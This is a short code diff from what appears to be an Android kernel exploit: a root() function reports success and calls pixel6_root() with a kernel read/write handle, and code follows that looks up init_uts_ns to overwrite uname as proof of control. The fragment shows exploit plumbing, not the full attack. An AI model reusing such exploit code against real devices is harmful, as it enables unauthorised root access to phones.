@@ -246,7 +246,8 @@ int pixel6_root(struct rw_info *rw) {
 
 int root(struct rw_info *rw) {
     LOG("\n[x] Success! Time to root\n");
-        return pixel6_root(rw);
+    return pixel6_root(rw);
+}
 
     LOG("[x] Prove that we succeeded by overwriting uname\n");
     u64 init_uts_ns = kallsyms_lookup_name(rw, "init_uts_ns");
